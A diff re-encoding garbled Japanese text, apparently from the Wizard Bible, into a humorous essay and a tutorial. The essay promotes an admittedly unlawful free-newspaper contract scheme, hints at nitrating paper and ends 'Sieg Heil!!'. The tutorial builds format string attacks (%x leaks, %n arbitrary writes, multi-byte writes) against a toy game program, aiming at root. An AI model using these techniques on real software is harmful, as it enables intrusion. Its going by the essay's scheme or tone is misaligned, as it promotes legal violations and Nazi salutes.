-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
---- ��4��: �͂��߂Ẵn�b�L���O�@�`�t�H�[�}�b�g�X�g�����O�U��2�` ---
-
-���ҁFDefolos
+著者：理事長
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@�O��͔C�Ӄ������Ԓn�̃��������e���o�͂�����@��������܂����B����̓t
-�H�[�}�b�g�X�g�����O�U���̐^�����ł���A�C�Ӄ������Ԓn�̔C�ӏ�����������
-�����܂��B
+　Guten Tag !
+　Wie geht es Ihnen ?
+
+　ちょくちょく、EPSILON殿 Wizard Bibleで原稿を執筆させていただいておりま
+す、宗凶法人愛連合中央執行委員会執行統括理事長Rudolph von Gartheimerでご
+ざいます。え？　名前が長い？　でも、ドイツ語だと、Der vollstreckende Vor
+sitzender des zentralen Exekutivkomiteesになってしまうのでもっと長くなり
+ます……。
+
+　さて、今回は新聞を無料で読む方法を……。
+　え？　知ってる？
+
+……。
+
+……えー、その。そうするとネタがいきなり消滅（髪も）するので、読んでやっ
+てください。お願いします。今でも通用するネタなので、いや、ホントに。
 
 
-��0x02.) �������ݕϊ��w�蕶��
+■0x02.) 新聞勧誘の実態
 
-�@�ʏ�A�ϊ��w�蕶���͏o�͂���`�����w�肷����̂ł����A�����ѐF�̈Ⴄ��
-���w�蕶�������݂��܂��B���ꂪ�u%n�v�Ƃ����ϊ��w�蕶���ł��B%n�́A���̊�
-�����ł���܂łɏo�͂��ꂽ���������A�Ή���������̕ϐ��Ɋi�[���܂��B��
-��A���������ւ̏������݂��\�ȕϊ��w�蕶���Ȃ̂ł��B
+　新聞は既に時代遅れのメディアになりつつあり、購読している世帯が激減して
+いる模様です。大変なのは新聞勧誘員のオジサン達。
 
-��%n�̎��ۂ̓���
+　なにしろノルマを達成できないと、悲惨なお仕置きが待っているのです。三角
+木馬に鞭やロウソクは基本、否、それ以上の恐怖のお仕置きが……。
 
-�@%n�̎��ۂ̓����́A���̂悤�ȃR�[�h�Ŋm�F�ł��܂��B���̃R�[�h��printf()
-��"Hello World!"�Ƃ�����������o�͂��A���̌�%n�ŏo�͂�����������test�Ƃ�
-���ϐ��Ɋi�[���Ă��܂��B
+　さて、ノルマを達成しないとお仕置きが待っているオジサンたちはあらゆる手
+段で契約を迫ってきます。我が家は学生アパートの一角に紛れ込んでいるので、
+学生を狙った新聞勧誘員のオジサンが我が家のベルをウッカリ鳴らすと、地雷を
+踏んだも同然です。以前、宗教勧誘の人が来ましたが、理事官邸の玄関には旧ソ
+連の旗が飾ってあるので、彼らはドアを開けた瞬間に無言で去っていきました。
+なかなか便利ですが、共産主義者と誤解される恐れがあるので、世間体を気にす
+る人は止めましょう。
 
------�@test.c
+　他にも浄水器の勧誘が来ましたが、我が家は例によってドアを開けた瞬間、実
+験器具の山が並んでいる上、純水製造装置があるので、見ただけで帰って行きま
+した。もっと面白い来客はいないのでしょうか、ワタクシは寂しくてしかたあり
+ません。
+
+　話を戻して本題に入りますが、新聞勧誘のオジサン達が来た場合は以下の呪文
+を唱えるだけで、退散していくか、新聞が無料で読めてしまいます。
+
+「置き勧なら良いですよ。」
+
+　これでオジサンたちは帰っていくか、現金を置いていって新聞を無料で読める
+ことになります。どうして、こんなことが可能なのでしょうか？
+
+　新聞の契約は大抵、三ヶ月で一万円前後ですが、一世帯あたりの契約成立報酬
+料、もしくは勧誘ノルマを達成した場合は、一万円以上の報酬が出るため（ノル
+マを達成するとボーナスも出る）、オジサン達にとっては契約数がイノチなので
+す。
+　なので、新聞を無料で読めるワタシもシアワセ、オジサンもノルマを達成でき
+てハッピーワタシもアナタもウレシイグンニュースグンニュースモーマンタイ（
+注：無問題）な訳なのです。
+
+　が、実はこの契約方法は独占禁止法第十九条（不公正な取引の禁止）違反、景
+品表示法第三条（景品類の制限及び禁止）違反、さらに「新聞業における景品類
+の提供に関する事項の制限」（平成12年公正取引委員会告示第29号。「新聞業景
+品制限告示」と呼ぶ）と色々規制されており、オジサンたちはこの事がバレると
+即効で首になります。
+
+　ナニ、心配は要りません、処分されるのは勧誘員のオジサンだけで契約者には
+処分はありません。五年間、新聞をタダで読み続けているワタシが言うのですか
+ら、間違いありません。
+
+　ただ、ここで一応注意しておきたいのは、口頭では置き勧は成立しないので必
+ず、契約書に「購読料領収済み」と勧誘員のオジサンに一筆入れてもらいましょ
+う。あとは販売店から確認の電話が架かってきますが、適当に済ませます。
+
+　ワタシの場合は後から来る集金の人が面倒なのでオジサンに全部処理を任せて
+あるので、集金も来ません。ただ新聞の契約書にサインしてハンコ押して、一筆
+「購読料領収済み」入れてもらってそれで終わりです。
+
+　あとはオジサンから洗剤貰うなり、ビール券貰うなりしましょう。ただ、洗剤
+やビール券などの景品は全部オジサン達の自腹なのであんまり欲張らないよう。
+契約が成り立ってもビール券などが減っていないと販売店の監査に引っかかると
+言われて、ビール券を毎回置いていく某朝目新聞のオジサンもいますが、ホント
+ウにこの業界は色々厳しい模様です。
+
+　この調子でワタシは朝目新聞と読瓜新聞を五年間、無料で契約してます（最近
+は毎目も）。新聞三誌もとっていると読むのも大変で邪魔ですが（朝目などの売
+国新聞はそのままゴミ箱行きがおおいですが）。
+
+　新聞は読まないので、朝に投函されたら、そのまま我が連合理事官邸のペット
+で緊急時における「非常食」のウサギの「メンチ（雄）」のトイレの敷材になっ
+てます。後はビルマニシキヘビ、ボアコンストリクター等の大蛇の敷材にも便利
+です。
+
+　トイレットペーパーにならないのが不便ですね。それでも大量にあって邪魔で
+仕方ないので、硝酸で硝化してみると良いかもしれません。
+
+　まぁ、オトナの事情で硝化してどうするのかは読者の皆様のご想像にお任せし
+ます。
+　新聞勧誘でうんざりしていたり、ご家庭の経済的負担をすこしでも減らす事が
+出来れば愛連合の長として嬉しいことはありません。
+
+
+■0x03.) 最後に
+
+　皆様も新聞勧誘員が来たら、勇気を持って「置き勧」で、と一言言ってみまし
+ょう。必ず退散するか、新聞をタダで読めてしまいます。
+
+　是非おためしあれ。
+
+　それではAuf Wiedersehen!！ Sieg Heil!!
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: はじめてのハッキング　〜フォーマットストリング攻撃2〜 ---
+
+著者：Defolos
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回は任意メモリ番地のメモリ内容を出力する方法を解説しました。今回はフ
+ォーマットストリング攻撃の真骨頂である、任意メモリ番地の任意書き換えを解
+説します。
+
+
+■0x02.) 書き込み変換指定文字
+
+　通常、変換指定文字は出力する形式を指定するものですが、少し毛色の違う変
+換指定文字も存在します。それが「%n」という変換指定文字です。%nは、その関
+数内でそれまでに出力された文字数を、対応する引数の変数に格納します。つま
+り、メモリ内への書き込みが可能な変換指定文字なのです。
+
+●%nの実際の動き
+
+　%nの実際の動きは、次のようなコードで確認できます。このコードはprintf()
+で"Hello World!"という文字列を出力し、その後%nで出力した文字数をtestとい
+う変数に格納しています。
+
+-----　test.c
 #include <stdio.h>
 
 int main(int argc, char *argv[]){
@@ -858,9 +858,9 @@ int main(int argc, char *argv[]){
 }
 -----
 
-�@%n�͎w�肳�ꂽ�A�h���X�ɒl���i�[����̂ŁAprintf()�ւ̑�2�����ɂ̓A�h��
-�X������&��t�^���Ȃ���΂Ȃ�܂���B������R���p�C�������s����Ǝ��̂悤
-�Ȍ��ʂ������܂��B
+　%nは指定されたアドレスに値を格納するので、printf()への第2引数にはアドレ
+スを示す&を付与しなければなりません。これをコンパイルし実行すると次のよう
+な結果が得られます。
 
 -----
 defolos@Glazheim:~/Desktop$ gcc -Wall test.c
@@ -869,19 +869,19 @@ Hello World!
 12
 -----
 
-�@�uHello World!�v��12�����ł��̂ŁAtest�̒��ɂ�12���i�[����܂��B�܂�A
-%n�͂���܂łɏo�͂����o�C�g�����������ނ̂ł��B��������܂����p����΁A
-�C�ӂ̒l���������ނ��Ƃ��\�ƂȂ�܂��B
+　「Hello World!」は12文字ですので、testの中には12が格納されます。つまり、
+%nはそれまでに出力したバイト数を書き込むのです。これをうまく利用すれば、
+任意の値を書き込むことが可能となります。
 
 
-��0x03.) �ϐ��̏�������
+■0x03.) 変数の書き換え
 
-�@�ł͎��ۂɁA�ϐ��̒��g�����������Ă݂܂��B���̃R�[�h�̓Q�[���v���O����
-�̍��i�ł��B�Q�[�����͂��߂�ɂ������āA�R�}���h���C�������Ń��[�U�����w
-�肵�܂��B�Ō�Ƀ��[�U���ƃX�R�A��\�����܂��B����̓Q�[�����[�`��������
-���Ȃ��̂ŁA�X�R�A�͏��0�ɂȂ�͂��ł��B
+　では実際に、変数の中身を書き換えてみます。次のコードはゲームプログラム
+の骨格です。ゲームをはじめるにあたって、コマンドライン引数でユーザ名を指
+定します。最後にユーザ名とスコアを表示します。今回はゲームルーチンが存在
+しないので、スコアは常に0になるはずです。
 
------�@game.c
+-----　game.c
 #include <stdio.h>
 
 int main(int argc, char *argv[]){
@@ -914,7 +914,7 @@ int main(int argc, char *argv[]){
 }
 -----
 
-�@���̃R�[�h���R���p�C�����A���s����Ǝ��̂悤�ɂȂ�܂��B
+　このコードをコンパイルし、実行すると次のようになります。
 
 -----
 newbie@Glazheim:knoppix$ game.exe Defolos
@@ -923,9 +923,9 @@ newbie@Glazheim:knoppix$ game.exe Defolos
 Score of Defolos is 0(0)!!
 -----
 
-�@�������Ȃ���A���Ă̂Ƃ���uprintf(name);�v�̕����Ƀt�H�[�}�b�g�X�g����
-�O�o�O�����݂��Ă��܂��B�����Ŏ��̂悤�ɁA�ϊ��w�蕶�����܂ޕ���������[
-�U���Ƃ��ė^����ƃ����������{���ł��Ă��܂��܂��B
+　しかしながら、見てのとおり「printf(name);」の部分にフォーマットストリン
+グバグが存在しています。ここで次のように、変換指定文字を含む文字列をユー
+ザ名として与えるとメモリ内が閲覧できてしまいます。
 
 -----
 newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
@@ -934,26 +934,26 @@ newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
 Score of AAAAbffffb6b.1.bffff8c4.4d532038.532050.b7eb116c.1.41414141.252e7825.78252e78 is 0(0)!!
 -----
 
-�@���ڂ��Ă������������̂́u41414141�v�̕����ł��B����41�̘A���̓t�H�[�}
-�b�g�X�g�����O�̊J�n������\���Ă���̂ł��B���̂Ƃ��̃������͎��̂悤��
-���C�A�E�g�ɂȂ��Ă��܂��B
+　注目していただきたいのは「41414141」の部分です。この41の連続はフォーマ
+ットストリングの開始部分を表しているのです。このときのメモリは次のような
+レイアウトになっています。
 
 [stack]
 0x00----------------------------------------------low
-    name�ւ̃A�h���X                                   ��
+    nameへのアドレス                                   ↑
 0x04----------------------------------------------     |
     SFP(bffffb6b)                                      |printf()
 0x08----------------------------------------------     |
     ???(1)                                             |
 0x0c----------------------------------------------     |
     SEIP(bffff8c4)                                     |
-0x0c----------------------------------------------     ��
+0x0c----------------------------------------------     ↓
     ????(4d532038)
 0x10----------------------------------------------
     ????(532050)
 0x14----------------------------------------------
     ????(b7eb116c)
-0x18----------------------------------------------      ��
+0x18----------------------------------------------      ↑
     starge(1)                                           |
 0x1c----------------------------------------------      |
     name[150]="AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"       |
@@ -964,115 +964,115 @@ Score of AAAAbffffb6b.1.bffff8c4.4d532038.532050.b7eb116c.1.41414141.252e7825.78
 0xd8----------------------------------------------      |
     SFP                                                 |
 0xdc----------------------------------------------      |
-    SEIP                                                ��
+    SEIP                                                ↓
 0xe0----------------------------------------------high
 
-�@printf()���Ăяo�����ƁA�����Ƃ��ēn���ꂽ�A�t�H�[�}�b�g�X�g�����O��
-�i�[���ꂽ�A�h���X���珇����������o�͂��Ă����܂��B�����ł̓t�H�[�}�b�g
-�X�g�����O�̃A�h���X�Ƃ���name(0x1c)�̃A�h���X���n����Ă��邽�߁Amain()
-����name�̒��g�������o�͂��܂��B5�����ڂ���ϊ��w�蕶�����o�����Ă��邽�߁A
-�{����2�������i�[����Ă���ł��낤0x04�̃A�h���X���o�͂��܂��B8�ڂ̕�
-���w�蕶�����o�͂���i�K�ɂȂ�ƁA��8�������i�[����Ă���ł��낤�ꏊ��
-0x1c�ł��邽��name�̒��g���o�͂���Ă����܂��B�܂�A�u41414141�v��name
-�̐擪���o�͂��Ă���̂ł��B
+　printf()が呼び出されると、引数として渡された、フォーマットストリングの
+格納されたアドレスから順次文字列を出力していきます。ここではフォーマット
+ストリングのアドレスとしてname(0x1c)のアドレスが渡されているため、main()
+内のnameの中身を順次出力します。5文字目から変換指定文字が出現しているため、
+本来第2引数が格納されているであろう0x04のアドレスを出力します。8つ目の変
+換指定文字を出力する段階になると、第8引数が格納されているであろう場所は
+0x1cであるためnameの中身が出力されていきます。つまり、「41414141」はname
+の先頭を出力しているのです。
 
-�@�����ŁA�uAAAA�v�������Ƃ��ĎQ�Ƃ���8�ڂ̕ϊ��w�蕶����%n�ɕς��܂��B
-%n�͑Ή���������Ŏw�肳�ꂽ�A�h���X�ɏo�͂����o�C�g�����������ޕϊ��w��
-�����ł����B�܂�A0x41414141�Ԓn�iAAAA��16�i���ŕ\�������0x41414141�j
-��51�Ƃ����l�������������Ƃ��܂��B�������Ȃ���A0x41414141�Ԓn�͏�������
-��������Ȃ��̈�ł��̂ŃZ�O�����e�[�V�����t�H���g���������܂��B
+　ここで、「AAAA」を引数として参照する8つ目の変換指定文字を%nに変えます。
+%nは対応する引数で指定されたアドレスに出力したバイト数を書き込む変換指定
+文字でした。つまり、0x41414141番地（AAAAを16進数で表示すると0x41414141）
+に51という値を書き込もうとします。しかしながら、0x41414141番地は書き込み
+が許されない領域ですのでセグメンテーションフォルトが発生します。
 
 -----
 newbie@Glazheim:knoppix$ game.exe AAAA%x.%x.%x.%x.%x.%x.%x.%n.%x.%x
 [debug]addr of score = bffff98c
 [debug]addr of payload = bffff950
-�Z�O�����e�[�V�����ᔽ�ł�
+セグメンテーション違反です
 -----
 
-�@0x41414141�Ԓn�͏������ݕs�̈�ł������A���̕��@�����p����score�ϐ���
-�A�h���X�����������邱�Ƃ��ł���΃Q�[���̃X�R�A�����R�ɏ��������邱�Ƃ�
-�ł���̂ł��Bscore�ϐ��̓f�o�b�O�����0xbffff98c�Ԓn�ɑ��݂��Ă��邱��
-���m�F�ł��܂��B�ł��̂ŁA�O���AAAA(41414141)�Ƃ��Ă���������bffff98c��
-�ύX���Ă��΁Ascore�ϐ������������邱�Ƃ��ł��܂��B
+　0x41414141番地は書き込み不可領域でしたが、この方法を応用してscore変数の
+アドレスを書き換えることができればゲームのスコアを自由に書き換えることが
+できるのです。score変数はデバッグ情報より0xbffff98c番地に存在していること
+が確認できます。ですので、前回はAAAA(41414141)としていた部分をbffff98cに
+変更してやれば、score変数を書き換えることができます。
 
-�����g���G���f�B�A��
+●リトルエンディアン
 
-�@�A�h���X���\������ꍇ�A�G���f�B�A�����l�����Ȃ���΂Ȃ�܂���Bx86�n��
-linux�ł̓��g���G���f�B�A�����̗p����Ă��܂��B�G���f�B�A���͈ȑO�q�ׂ܂�
-���ʂ�A16�i���̋L�q�����̈Ⴂ�ł��B�����炢�Ƃ��Ă�����x������܂��B��
-�g���G���f�B�A���̏ꍇ��bffff98c�Ƃ����l���\�z����ɂ́A�܂�2������؂�
-�܂��B���Ɉ�ԍ��̃u���b�N����ԉE�ɏ����A��Ԗڂɍ��̃u���b�N�����̑O��
-�z�u���܂��B�܂�A�u8c f9 ff bf�v�ƂȂ�킯�ł��B
+　アドレスを構成する場合、エンディアンを考慮しなければなりません。x86系の
+linuxではリトルエンディアンが採用されています。エンディアンは以前述べまし
+た通り、16進数の記述順序の違いです。おさらいとしてもう一度解説します。リ
+トルエンディアンの場合はbffff98cという値を構築するには、まず2桁ずつ区切り
+ます。次に一番左のブロックを一番右に書き、二番目に左のブロックをその前に
+配置します。つまり、「8c f9 ff bf」となるわけです。
 
-��perl�ɂ��o��
+●perlによる出力
 
-�@�u8c f9 ff bf�v�Ƃ���16�i�����t�H�[�}�b�g�X�g�����O�̍ŏ��̕����ɋL�q��
-��΁Abfffff98c�Ԓn�̓��e�������������邱�Ƃ��킩��܂����B�������A16�i
-���̓L�[�{�[�h���璼�ړ��͂��邱�Ƃ͂ł��܂���BASCII�R�[�h�Ɋ���U����
-����16�i���́A���낤���ē��͂��\�ł���0xff��0xfa�Ȃǂ�16�i���͓��͂��s
-�\�ł��B�����ŁAPerl�𗘗p���Ă����̐��l����͂��܂��B
-�@Perl�̓C���^�v���^�^�̃X�N���v�g����ŁA�R�}���h���C����ł����삳����
-���Ƃ��ł��܂��BC�����printf()�̂悤��16�i�����o�͂��邱�Ƃ��ł���̂ŁA
-����𗘗p���܂��B�R�}���h���C����Perl�𗘗p����ꍇ�́u`printf "\x8c\xf9
-\xff\xbf"`�v�̂悤�Ɂu`�v�ň݂͂܂��B\x��16�i���ł��邱�Ƃ�\���̂ŁA0x8c
-f9ffbf���o�͂���܂��B
-�@�ȏ�̒m�����Ȃ����킹�āAscore�ϐ������������Ă݂܂��傤�B���̂悤��
-����������[�U���Ƃ��ēo�^�����score�ϐ���51�ɏ����������܂��B
+　「8c f9 ff bf」という16進数をフォーマットストリングの最初の部分に記述す
+れば、bfffff98c番地の内容を書き換えられることがわかりました。しかし、16進
+数はキーボードから直接入力することはできません。ASCIIコードに割り振られて
+いる16進数は、かろうじて入力が可能ですが0xffや0xfaなどの16進数は入力が不
+可能です。そこで、Perlを利用してこれらの数値を入力します。
+　Perlはインタプリタ型のスクリプト言語で、コマンドライン上でも動作させる
+ことができます。C言語のprintf()のように16進数を出力することができるので、
+これを利用します。コマンドラインでPerlを利用する場合は「`printf "\x8c\xf9
+\xff\xbf"`」のように「`」で囲みます。\xが16進数であることを表すので、0x8c
+f9ffbfが出力されます。
+　以上の知識をつなぎ合わせて、score変数を書き換えてみましょう。次のような
+文字列をユーザ名として登録すればscore変数が51に書き換えられます。
 
-�����L�̃R�[�h�ł�score�̏ꏊ��bffff99c�ɂȂ��Ă��܂����A����̓t�H�[�}�b
-�g�X�g�����O�̒����ɂ���ē��I�ɕϐ��̏ꏊ���m�ۂ���邽�߂ł��B
+※下記のコードではscoreの場所がbffff99cになっていますが、これはフォーマッ
+トストリングの長さによって動的に変数の場所が確保されるためです。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x9c\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
 [debug]addr of score = bffff99c
 [debug]addr of payload = bffff960
-Score of �^���\�^?fffb71.1.bffff8d4.4d532038.532050.b7eb116c.1. is 51(33)!! 
+Score of 鐃緒申鐃?fffb71.1.bffff8d4.4d532038.532050.b7eb116c.1. is 51(33)!! 
 -----
 
-�@printf()�̓t�H�[�}�b�g�X�g�����O�����ɏo�͂��A�ϊ��w�蕶�����������
-�{���o�͂��ׂ��ϐ����i�[����Ă���ł��낤�ꏊ�̓��e��\�����܂��B8�ڂ�
-�ϊ��w�蕶���̓t�H�[�}�b�g�X�g�����O���̂̏ꏊ���������߁A8�ڂ̕ϊ��w��
-������%n���w�肷��ƁA�t�H�[�}�b�g�X�����O�̍ŏ���32�o�C�g�i8cf9ffbf�j��
-�ǂ݂܂��B����𑍏o�̓o�C�g�����i�[����A�h���X�Ƃ��Ď戵���܂��B�䂦�ɁA
-8cf9ffbf�Ԓn��51���������܂�܂��B
-�@��L�̃R�[�h�ł�8cf9ffbf�Ԓn�Ɉʒu����ϐ��̓��e�����������܂������A�A
-�h���X�w�蕔��������������ΔC�ӂ̔Ԓn�ɏ������݂��ł��܂��B���̂悤�ɁA
-%n�ϊ��w�蕶���𗘗p����΁A�C�ӂ̃A�h���X�Ԓn�̃��������e�����������邱
-�Ƃ��ł��܂��B�������A%n�͂���܂łɏo�͂������������������ނ̂ŁA���̂�
-�܂ł͏������߂���e�����܂��Ă��܂��܂��B�C�ӂ̒l���������ނɂ́A���ɐ�
-������t�B�[���h���I�v�V�������K�v�ɂȂ�܂��B
+　printf()はフォーマットストリングを順に出力し、変換指定文字が見つかれば
+本来出力すべき変数が格納されているであろう場所の内容を表示します。8つ目の
+変換指定文字はフォーマットストリング自体の場所を示すため、8つ目の変換指定
+文字に%nを指定すると、フォーマットスリングの最初の32バイト（8cf9ffbf）を
+読みます。これを総出力バイト数を格納するアドレスとして取扱います。ゆえに、
+8cf9ffbf番地に51が書き込まれます。
+　上記のコードでは8cf9ffbf番地に位置する変数の内容を書き換えましたが、ア
+ドレス指定部分を書き換えれば任意の番地に書き込みができます。このように、
+%n変換指定文字を利用すれば、任意のアドレス番地のメモリ内容を書き換えるこ
+とができます。しかし、%nはそれまでに出力した文字数を書き込むので、このま
+までは書き込める内容が決まってしまいます。任意の値を書き込むには、次に説
+明するフィールド幅オプションが必要になります。
 
-���t�B�[���h���I�v�V����
+●フィールド幅オプション
 
-�@�t�B�[���h���I�v�V�����́A�ϊ��w�蕶���Ŏw�肳�ꂽ�f�[�^���o�͂���ɓ�
-�����Ă̍ŏ��������w�肷����̂ł��B�Ⴆ�΁A123�Ƃ����l��5���ŕ\�������
-���Ɏw�肷��΁A00123�̂悤�ɐ擪��0�Ńp�f�B���O����܂��B�L�q���@�́u%1
-00x�v�̂悤�ɁA%�̌�ɍŏ��������L�q���A����ɑ����ďo�̓t�H�[�}�b�g���w
-�肵�܂��B
+　フィールド幅オプションは、変換指定文字で指定されたデータを出力するに当
+たっての最小桁数を指定するものです。例えば、123という値を5桁で表示するよ
+うに指定すれば、00123のように先頭が0でパディングされます。記述方法は「%1
+00x」のように、%の後に最小桁数を記述し、それに続けて出力フォーマットを指
+定します。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x9c\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%10x.%n
 [debug]addr of score = bffff99c
 [debug]addr of payload = bffff960
-Score of �^���\�^?fffb6f.1.bffff8d4.4d532038.532050.b7eb116c. 1. is 60(3c)!!
+Score of 鐃緒申鐃?fffb6f.1.bffff8d4.4d532038.532050.b7eb116c. 1. is 60(3c)!!
 -----
 
-�@���̂悤�ɁA�t�B�[���h���I�v�V�����𗘗p����΁A�C�ӂ̒l��ϐ��ɏ�����
-�ނ��Ƃ��ł��܂��B�������A���������ڎw���Ă��邱�Ƃ́ASEIP�̈���y�C���[
-�h���i�[���ꂽ�������Ԓn�ɏ���������root������D�悷�邱�Ƃł��B�t�B�[��
-�h���Ŏw��ł���l�͂����đ傫���Ȃ��A�A�h���X�̂悤�ȑ傫�Ȓl���t�B�[��
-�h���Ɏw�肷�邱�Ƃ͂ł��܂���B�䂦�ɁA�������̂悤�ȑ傫�Ȓl����������
-�ɂ͓��ʂȃe�N�j�b�N���K�v�ɂȂ�܂��B
+　このように、フィールド幅オプションを利用すれば、任意の値を変数に書き込
+むことができます。しかし、私たちが目指していることは、SEIP領域をペイロー
+ドが格納されたメモリ番地に書き換えてroot権限を奪取することです。フィール
+ド幅で指定できる値はさして大きくなく、アドレスのような大きな値をフィール
+ド幅に指定することはできません。ゆえに、メモリのような大きな値を書き込む
+には特別なテクニックが必要になります。
 
 
-��0x04.) ���i�K�������݃e�N�j�b�N
+■0x04.) 多段階書き込みテクニック
 
-�@�������ݐ�Ƃ��Ďw�肵��8cf9ffbf�ł����A������ŉ��ʂ̌��Ƃ��čl������
-���A1������8df9ffbf�Ƃ����A�h���X�͍ŉ��ʂ���2���ڂƂ��Ĉ������Ƃ��ł���
-���B���l�ɁA2������8ef9ffbf��3���ڂł���A8ff9ffbf��4���ڂƂ��Ĉ����܂��B
-����āAbffff98c�Ԓn��aa000000���������݁A���̌��bffff98d�Ԓn��bb000000
-���������݁A����bffff98e�Ԓn��cc000000���Abffff98f�Ԓn��dd000000��������
-�߂΁Abffff98c�Ԓn���猩��΁uaabbccdd�v���������܂ꂽ���ƂɂȂ�܂��B
+　書き込み先として指定した8cf9ffbfですが、これを最下位の桁として考えた場
+合、1足した8df9ffbfというアドレスは最下位から2桁目として扱うことができま
+す。同様に、2足した8ef9ffbfは3桁目であり、8ff9ffbfは4桁目として扱えます。
+よって、bffff98c番地にaa000000を書き込み、その後にbffff98d番地にbb000000
+を書き込み、次にbffff98e番地にcc000000を、bffff98f番地にdd000000を書き込
+めば、bffff98c番地から見れば「aabbccdd」が書き込まれたことになります。
 
 --------------------------bffff98c
 aa 00 00 00
@@ -1085,268 +1085,268 @@ aa 00 00 00
 ==========================
 aa bb cc dd
 
-�@���̂悤��4�̃A�h���X�����ꂼ��̌��Ƃ��Ĉ����A�C�ӂ̐��l���������ނ�
-�Ƃ��ł��܂��B��̓I�ɂ́u`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\x
-f9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n�v�̂悤�ɁA�t�H�[�}�b
-�g�X�g�����O��4�̃A�h���X�𗧂đ����ɏ����܂��B���߂�%n�̓t�H�[�}�b�g�X
-�g�����O�̏��߂�4�o�C�g���Q�Ƃ��A����%n�̓t�H�[�}�b�g�X�g�����O��4�o�C�g��
-����7�o�C�g�ڂ܂ł�4�o�C�g���Q�Ƃ��܂��B
+　このように4つのアドレスをそれぞれの桁として扱い、任意の数値を書き込むこ
+とができます。具体的には「`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\x
+f9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n」のように、フォーマッ
+トストリングに4つのアドレスを立て続けに書きます。初めの%nはフォーマットス
+トリングの初めの4バイトを参照し、次の%nはフォーマットストリングの4バイト目
+から7バイト目までの4バイトを参照します。
 
-�@��Ƃ���0xddccbbaa�Ƃ����l��score�ɏ�������ł݂܂��傤�B���g���G���f�B
-�A���ł��̂ŁA�͂��߂�bffff98c�Ԓn��0x000000aa���������݂܂��B
+　例として0xddccbbaaという値をscoreに書き込んでみましょう。リトルエンディ
+アンですので、はじめにbffff98c番地に0x000000aaを書き込みます。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n
 [debug]addr of score = bffff98c
 [debug]addr of payload = bffff950
-Score of �^���\�^���\�^���\�^���\�^?fffb65.1.bffff8c4.4d532038.532050.b7eb116c.1. is 63(3f)!! 
+Score of 鐃緒申鐃緒申鐃緒申鐃緒申鐃?fffb65.1.bffff8c4.4d532038.532050.b7eb116c.1. is 63(3f)!! 
 -----
 
-�@�t�B�[���h���I�v�V�����Ȃ��̏�Ԃł�63�Ƃ����l���������܂�܂��B�����
-0xaa�ɂ���ɂ́A���Ƃǂꂾ���̏o�͂�]���ɍs���΂悢�ł��傤���B0xaa��10
-�i����170�ł��̂ŁA170-63=107�B�܂�A108������]���ɏo�͂����0xaa����
-�����߂܂��B
+　フィールド幅オプションなしの状態では63という値が書き込まれます。これを
+0xaaにするには、あとどれだけの出力を余分に行えばよいでしょうか。0xaaは10
+進数で170ですので、170-63=107。つまり、108文字を余分に出力すれば0xaaを書
+き込めます。
 
 -----
 newbie@Glazheim:knoppix$ game.exe `printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%108x.%n
 [debug]addr of score = bffff98c
 [debug]addr of payload = bffff950
-Score of �^���\�^���\�^���\�^���\�^?fffb62.1.bffff8c4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
+Score of 鐃緒申鐃緒申鐃緒申鐃緒申鐃?fffb62.1.bffff8c4.4d532038.532050.b7eb116c. 1. is 170(aa)!! 
 -----
 
-�@���ɁA2���ڂ̏o�͂��s���܂��B2���ڂ�bffff98d�Ԓn��0x000000bb����������
-�܂��B���݂̂Ƃ���A170(0xaa)�o�C�g�̏o�͂��ł��Ă��܂����A0xbb�͂�������
-�����17�o�C�g�]���ɕ������o�͂��Ȃ��Ă͂Ȃ�܂���B���R�Abffff98c�Ԓn��
-aa���i�[���邽�߂ɗ��p����%108x�̌��ɁA�t�B�[���h���I�v�V�������w�肵��
-����΂Ȃ�܂���B�������A%108x�̌��ɂ͂����ϊ��w�蕶���͂���܂���B��
-���̂ŁA�u`printf "\x8c\xf9\xff\xbf\x8d\xf9\xff\xbf\x8e\xf9\xff\xbf\x8f\
-xf9\xff\xbf"`%x.%x.%x.%x.%x.%x.%x.%n.%x.%n.%x.%n.%x.%n�v�̂悤�ɂЂƂ�
-��%n�̌���%x��z�u���A���̌���2���ڂ�%n��u���܂��B
-�@�������A���̂܂܂ł�2���ڂ�%n�̑O��%x���A�{��2���ڂ̃A�h���X�ł���\x8d
